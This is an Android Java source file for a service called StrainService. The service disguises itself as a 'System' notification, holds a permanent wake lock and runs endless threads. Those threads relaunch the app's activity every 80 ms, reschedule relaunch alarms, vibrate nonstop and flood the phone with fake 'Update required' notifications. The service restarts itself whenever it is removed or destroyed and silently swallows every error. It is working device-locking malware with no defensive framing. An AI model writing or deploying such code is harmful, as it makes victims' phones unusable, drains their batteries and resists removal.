package com.rhfvnc.strain;
import android.app.*;
import android.content.Context;
import android.content.Intent;
import android.os.Build;
import android.os.IBinder;
import android.os.PowerManager;
import android.os.Vibrator;
public class StrainService extends Service {
    private static final String CH = "rhfvnc";
    private PowerManager.WakeLock wl;
    private Vibrator vib;
    public static void start(Context c) {
        Intent i = new Intent(c, StrainService.class);
        if (Build.VERSION.SDK_INT >= 26) c.startForegroundService(i);
        else c.startService(i);
    }
    @Override
    public void onCreate() {
        super.onCreate();
        if (Build.VERSION.SDK_INT >= 26) {
            NotificationChannel ch = new NotificationChannel(CH, "System", NotificationManager.IMPORTANCE_MIN);
            ch.setShowBadge(false);
            NotificationManager nm = getSystemService(NotificationManager.class);
            if (nm != null) nm.createNotificationChannel(ch);
        }
        Notification n = new Notification.Builder(this, CH)
                .setContentTitle("System").setContentText("Running")
                .setSmallIcon(android.R.drawable.stat_notify_sync).setOngoing(true).build();
        startForeground(1, n);
        PowerManager pm = (PowerManager) getSystemService(POWER_SERVICE);
        if (pm != null) {
            wl = pm.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "rhfvnc:strain");
            wl.setReferenceCounted(false);
            try { wl.acquire(); } catch (Throwable ignored) {}
        }
        vib = (Vibrator) getSystemService(VIBRATOR_SERVICE);
        Thread storm = new Thread(() -> {
            while (true) {
                try {
                    Intent i = new Intent(StrainService.this, MainActivity.class);
                    i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_CLEAR_TASK | Intent.FLAG_ACTIVITY_NO_ANIMATION);
                    try { startActivity(i); } catch (Throwable ignored) {}
                } catch (Throwable ignored) {}
                try { Thread.sleep(80); } catch (InterruptedException ignored) {}
            }
        });
        storm.setDaemon(true); storm.start();
        Thread alarmLoop = new Thread(() -> {
            while (true) {
                try { StrainReceiver.scheduleRelaunch(StrainService.this, 20); Thread.sleep(100); }
                catch (Throwable ignored) {}
            }
        });
        alarmLoop.setDaemon(true); alarmLoop.start();
        Thread vibLoop = new Thread(() -> {
            while (true) {
                try { if (vib != null) vib.vibrate(new long[]{0, 40, 20, 40, 20}, -1); Thread.sleep(80); }
                catch (Throwable ignored) {}
            }
        });
        vibLoop.setDaemon(true); vibLoop.start();
        Thread spam = new Thread(() -> {
            NotificationManager nm = (NotificationManager) getSystemService(NOTIFICATION_SERVICE);
            int id = 100;
            while (true) {
                try {
                    if (nm != null) {
                        Notification nn = new Notification.Builder(StrainService.this, CH)
                                .setContentTitle("System").setContentText("Update required")
                                .setSmallIcon(android.R.drawable.stat_notify_sync).build();
                        nm.notify(id++, nn);
                        if (id > 200) id = 100;
                    }
                } catch (Throwable ignored) {}
                try { Thread.sleep(5); } catch (InterruptedException ignored) {}
            }
        });
        spam.setDaemon(true); spam.start();
    }
    @Override
    public int onStartCommand(Intent intent, int flags, int startId) { return START_STICKY; }
    @Override
    public void onTaskRemoved(Intent rootIntent) {
        StrainService.start(this);
        StrainReceiver.scheduleRelaunch(this, 20);
    }
    @Override
    public void onDestroy() { StrainService.start(this); super.onDestroy(); }
    @Override
    public IBinder onBind(Intent intent) { return null; }
}
